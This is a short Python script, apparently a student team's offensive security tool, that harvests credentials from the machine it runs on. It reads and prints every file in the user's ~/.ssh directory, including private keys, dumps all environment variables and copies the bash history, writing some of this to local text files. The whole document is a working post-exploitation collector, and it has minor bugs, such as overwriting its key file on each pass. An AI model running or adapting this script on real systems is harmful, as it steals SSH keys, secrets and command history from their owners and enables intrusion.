"""
Name: Alex Blondale
Team: Team Bravo
email: aeb5519@rit.edu
"""

import os
import sqlite3
#Grab ssh keys and export to sshkey.txt
if os.path.exists(os.path.expanduser("~/.ssh")):
    print("[+] ~/.ssh contents:")
    filelist = os.listdir(os.path.expanduser("~/.ssh/"))
    for file in filelist:
        fpath = "~/.ssh/%s" % file
        if os.path.isfile(os.path.expanduser(fpath)):
            print("[+] File: %s" % fpath)
            f = open(os.path.expanduser(fpath), "r")
            contents = f.read()
            print(contents)
            with open('sshkey.txt', 'w') as file:
                file.write(contents)
            print("-------------------------------------")
            print("")
#Grab os environment information and export to envContents.txt
print("[+] env contents:")
x = os.environ
for a,b in os.environ.items():
    print('{}:{}'.format(a,b))
    print("-------------------------------------")
    print("")

#Grab bash history and export to bashHistory.txt
if os.path.isfile(os.path.expanduser("~/.bash_history")):
    print("[+] ~/.bash_history contents:")
    o = "~/.bash_history"
    k = open(os.path.expanduser(o), "r")
    data = k.read()
    with open('bashHistory.txt', 'w') as file:
        file.write(data)
    print(data)
    print("-------------------------------------")
    print("")

